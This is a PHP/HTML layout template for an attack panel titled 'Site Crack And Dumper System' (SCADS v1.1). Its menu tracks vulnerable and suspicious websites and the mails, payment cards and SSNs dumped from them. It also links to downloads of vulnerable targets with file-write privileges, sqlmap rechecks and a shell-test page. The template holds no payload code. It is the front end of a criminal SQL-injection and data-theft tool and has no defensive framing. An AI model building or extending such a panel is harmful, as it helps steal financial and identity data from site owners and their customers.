<!DOCTYPE>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title>Site Crack And Dumper System</title>
<link href="favicon.ico" rel="shortcut icon" />

<?=$html->css('reset'); ?>
<?=$html->css('style'); ?>
<?//=$javascript->link('jquery');?>

<script type="text/javascript">

function ShowDiv(obj)
{
 document.getElementById('divId'+obj).style.display = 'block';
}

function ShowDiv2(obj)
{
 document.getElementById('divId'+obj).style.display = 'none';
}
</script>

<script type="text/javascript">
var qw=jQuery.noConflict();

function ShowOpenMenu(gen){
qw('#'+gen).slideToggle();
qw('#plus_'+gen).hide();
qw('#minus_'+gen).show();
}

function ShowCheckMinus(gen){
ShowOpenMenu(gen);
qw('#plus_'+gen).show();
qw('#minus_'+gen).hide();
}
</script>

<?=$javascript->link('prototype'); ?>
<?=$javascript->link('scriptaculous.js?load=effects,builder'); ?>

</head>

<body>

<!-- Logo -->

<div style='text-align:center;color:#FFFF00'>
<div>☠☠☠☠☠☠            SCADS v1.1     GET/POST/HTTPS/CRAWL           ☠☠☠☠☠☠</div>
</div>

<!-- End Logo -->

<div id="work" class="work" style="display: none;">
<div class="loader_big"></div>
</div>

<div class="wrap" style='background:#FFFFFF'>
<!-- START HEADER -->
<div id="header">
<nav class="top-navigation ">
<ul class="navigation-list">

<!-- Top Menu -->

<li class="<?=($this->params['action']=='mailinfo' || $this->params['action']=='add')?'active':'' ?>"><?=$html->link('STATE',array('action'=>'mailinfo')); ?></li>
<li class="<?=($this->params['action']=='index' || $this->params['action']=='krutaten')?'active':'' ?>"><?=$html->link('VULNERABLE ['.$usp.']',array('action'=>'index/3')); ?></li>
<li class="<?=($this->params['action']=='index2' || $this->params['action']=='krutaten')?'active':'' ?>"><?=$html->link('SUSPICIOUS ['.$usp22.']',array('action'=>'index2/1')); ?></li>
<li class="<?=($this->params['action']=='databases')?'active':'' ?>"><?=$html->link('MAILS ['.$usp2.']',array('action'=>'databases')); ?></li>
<li class="<?=($this->params['action']=='order_count')?'active':'' ?>"><?=$html->link('CARDS ['.$usp4.']',array('action'=>'order_count')); ?></li>
<li class="<?=($this->params['action']=='ssn_count')?'active':'' ?>"><?=$html->link('SSN ['.$usp44.']',array('action'=>'ssn_count')); ?></li>
<li class="<?=($this->params['action']=='domens')?'active':'' ?>"><?=$html->link('VULNERANLE DOMAIN ['.$domens10.']',array('action'=>'order_domens')); ?></li>
<li class="<?=($this->params['action']=='domens')?'active':'' ?>"><?=$html->link('BAD DOMAIN ['.$domens11.']',array('action'=>'order_domens_bad')); ?></li>
<li class="<?=($this->params['action']=='domens' || $this->params['action']=='domens2' || $this->params['action']=='domens3' || $this->params['action']=='domens4' || $this->params['action']=='download_domens')?'active':'' ?>"><?=$html->link('SAMPLE',array('action'=>'domens')); ?></li>
<li class="<?=($this->params['action']=='shelltest2' || $this->params['action']=='hash')?'active':'' ?>"><?=$html->link('OTHER',array('action'=>'shelltest2')); ?></li>

</ul>
</nav>
<!--
<div style="clear:both"></div>
<div style='text-align:left;'>

<ul class="navigation-list">

</ul>
</div>
-->
<div style="clear:both"></div><br>
</div>

<!-- STOP HEADER -->

<!-- START INFOBAR -->

<br><br>

<div class="infobar" style='text-align:center'>

<div class="fl"><?=$html->link('❌[CLEAR DATABASE]	[',array('action'=>'empty_databases'),array('class'=>'','onclick'=>'if(!confirm("ALL BASE WILL BE CLEANED. CONTINUE ?")){return false;}'))?></div>
<div class="fl">BAD LINKS: <?=$shlak;?>]	[<a href="/posts/post_recheck">🔄 RECHECK]		[</a></div>
<div class="fl">BAD DOMENS: <?=$shlak_domens;?>]	[<a href="/posts/domen_recheck">🔄 RECHECK]	[</a></div>
<div class="fl"><?=$html->link('🔄 SUSPICIOUS RECHECK]	[',array('action'=>'multi_duble_check'),array('class'=>'','onclick'=>'if(!confirm("ALL LINKS RECHECK. CONTINUE ?")){return false;}'))?></div>
<div class="fl"><?=$html->link('🔄 TABLE EMAIL RECHECK]	[',array('action'=>'multi_duble_check_email'),array('class'=>'','onclick'=>'if(!confirm("NEW SEARCH EMAIL. CONTINUE ?")){return false;}'))?></div>
<div class="fl"><a href="/posts/mailinfo2">🔄 UPDATE HOME PAGE]</a></div>
<br><br>

<div class="fl"> <a href="/posts/down_test">[⬇️ DOWNLOAD ALL VULN.]	[</a></div>
<div class="fl"> <a href="/posts/down_test_priv">⬇️ DOWN. ALL VULN. WRITE PERMISSION (file_priv)]	[</a></div>
<div class="fl"> <a href="/posts/down_multi">DOWN. ALL SUSPICIOUS (RECHECK SQLMAP)]</a></div>
<br>
</div>

<!-- STOP INFOBAR -->

<?=$content_for_layout;?>

<!-- START FOOTER -->
	
<!-- STOP FOOTER -->
</div>
</body>
</html>